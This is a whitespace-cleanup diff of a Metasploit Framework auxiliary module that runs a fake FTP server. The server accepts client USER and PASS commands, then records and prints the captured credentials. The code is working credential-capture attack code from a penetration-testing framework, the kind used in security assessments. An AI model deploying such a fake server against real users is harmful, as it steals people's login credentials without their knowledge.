@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::TcpServer
 	include Msf::Auxiliary::Report
 
-	
+
 	def initialize
 		super(
 			'Name'        => 'Authentication Capture: FTP',
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 				 	[ 'Capture' ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[
 					'Capture'
 				],
@@ -54,18 +54,18 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		exploit()
 	end
-	
+
 	def on_client_connect(c)
 		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
 		c.put "220 FTP Server Ready\r\n"
 	end
-	
+
 	def on_client_data(c)
 		data = c.get_once
 		return if not data
 		cmd,arg = data.strip.split(/\s+/, 2)
 		arg ||= ""
-		
+
 		if(cmd.upcase == "USER")
 			@state[c][:user] = arg
 			c.put "331 User name okay, need password...\r\n"
@@ -76,10 +76,10 @@ class Metasploit3 < Msf::Auxiliary
 			c.put "221 Logout\r\n"
 			return
 		end
-		
+
 		if(cmd.upcase == "PASS")
 			@state[c][:pass] = arg
-			
+
 			report_auth_info(
 				:host      => @state[c][:ip],
 				:proto     => 'ftp',
@@ -88,16 +88,16 @@ class Metasploit3 < Msf::Auxiliary
 				:user      => @state[c][:user],
 				:pass      => @state[c][:pass]
 			)
-			
+
 			print_status("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
 		end
 
 		@state[c][:pass] = data.strip
 		c.put "500 Error\r\n"
 		return
-							
+
 	end
-	
+
 	def on_client_close(c)
 		@state.delete(c)
 	end
